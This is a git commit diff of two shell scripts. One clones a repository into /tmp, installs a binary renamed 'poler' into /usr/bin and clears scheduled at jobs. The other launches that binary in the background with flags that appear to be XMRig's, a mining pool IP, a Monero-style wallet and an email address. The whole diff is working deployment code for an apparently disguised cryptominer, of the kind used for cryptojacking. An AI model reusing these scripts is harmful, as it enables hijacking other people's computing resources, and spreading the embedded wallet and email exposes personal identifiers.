b9999f69fc8c1acb88e227b12c255284bcdc321b
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-28 01:36:54 +0300

    t13

--- 65.sh
+++ 65.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 3 -o 94.103.94.89:5983 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass=t12-tachka:lyashko6666@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 3 -o 192.155.111.170:5999 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass=t13-norm-ruke:lyashko6666@gmail.com -k
--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/tachka/
+rm -rf /tmp/norm-ruke/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir tachka
-git clone https://github.com/tigoratka/tachka.git /tmp/tachka
-cd /tmp/tachka
-chmod +x /tmp/tachka/poler
+cd /tmp && mkdir norm-ruke
+git clone https://github.com/tigoratka/norm-ruke.git /tmp/norm-ruke
+cd /tmp/norm-ruke
+chmod +x /tmp/norm-ruke/poler
 chmod 777 ./*.sh
-cp /tmp/tachka/poler /usr/bin/
+cp /tmp/norm-ruke/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
